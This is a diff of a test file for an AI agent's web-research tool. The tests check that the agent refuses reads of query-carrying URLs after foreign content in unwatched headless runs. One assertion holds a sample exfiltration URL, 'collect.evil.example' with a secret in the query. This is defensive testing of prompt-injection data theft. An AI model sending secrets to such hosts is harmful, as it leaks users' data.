@@ -79,7 +79,7 @@ describe('a read URL with a query, after foreign content', () => {
     expect(tool.reads).toEqual(['https://collect.evil.example/p?d=secret']);
   });
 
-  it('is refused in a run nobody watches, also a headless one with no latch record, and nothing is read', async () => {
+  it('is refused in a headless run nobody watches, with no latch record, and nothing is read', async () => {
     const tool = webResearch();
     // A headless workflow step: no conversation latch object at all, only the run's own flags.
     const agent = agentOf({ tools: [tool], autonomy: 'autonomous', sendOrigin: { kind: 'workflowRun', name: 'Abgleich' }, ownerKnown: owner() });
